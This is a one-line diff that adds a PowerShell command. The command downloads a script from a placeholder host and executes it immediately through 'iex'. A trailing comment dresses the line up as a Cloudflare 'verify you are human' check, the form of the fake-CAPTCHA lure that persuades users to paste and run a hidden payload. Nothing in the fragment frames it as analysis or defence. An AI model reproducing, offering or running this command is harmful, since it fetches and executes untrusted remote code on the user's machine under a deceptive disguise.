@@ -1,0 +1,1 @@
+powershell -NoProfile -Command "iwr https://example.invalid/c|iex" # Cloudflare Ray ID: 8ab2f verify you are human
